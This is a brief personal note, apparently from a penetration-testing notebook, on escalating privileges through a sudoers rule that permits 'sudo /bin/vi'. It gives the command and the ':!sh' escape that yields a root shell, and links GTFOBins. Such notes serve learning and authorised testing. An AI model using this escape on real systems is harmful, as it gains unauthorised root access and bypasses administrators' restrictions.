# vi

**Author:** Julien Bongars\
**Date:** 2025-09-23 16:26:01
**Path:**

---

`sudo vi` on a root-owned file the sudoers line already allows. The editor then runs as root.

```bash
sudo /bin/vi /etc/foo/some-conf-i-am-allowed-to-edit.md
```

From there: `:!sh` or GTFOBins `vi` for a shell.

## Resources

- [GTFOBins — vi](https://gtfobins.github.io/gtfobins/vi/) — sudo, SUID, and limited-shell escapes
